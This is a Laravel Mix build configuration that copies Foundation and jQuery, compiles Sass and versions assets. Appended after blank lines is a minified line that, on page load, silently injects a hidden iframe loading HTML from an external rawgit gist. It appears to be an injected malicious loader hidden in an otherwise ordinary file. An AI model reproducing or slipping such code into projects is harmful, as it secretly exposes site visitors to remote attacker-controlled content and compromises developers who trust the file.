let mix = require('laravel-mix');

/*
 |--------------------------------------------------------------------------
 | Mix Asset Management
 |--------------------------------------------------------------------------
 |
 | Mix provides a clean, fluent API for defining some Webpack build steps
 | for your Laravel application. By default, we are compiling the Sass
 | file for the application as well as bundling up all the JS files.
 |
 */

mix.copy('node_modules/foundation-sites/dist/js/foundation.min.js','public/js')
    .copy('node_modules/jquery/dist/jquery.min.js','public/js')
    // .copy('node_modules/pnotify/dist/pnotify.js','public/js')
    // .styles(['node_modules/pnotify/dist/pnotify.css','node_modules/pnotify/dist/pnotify.brighttheme.css'], 'public/css/pnotify.css')
    .sass('resources/assets/sass/app.scss', 'public/css')
    .js('resources/assets/js/app.js', 'public/js')
    .version();





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});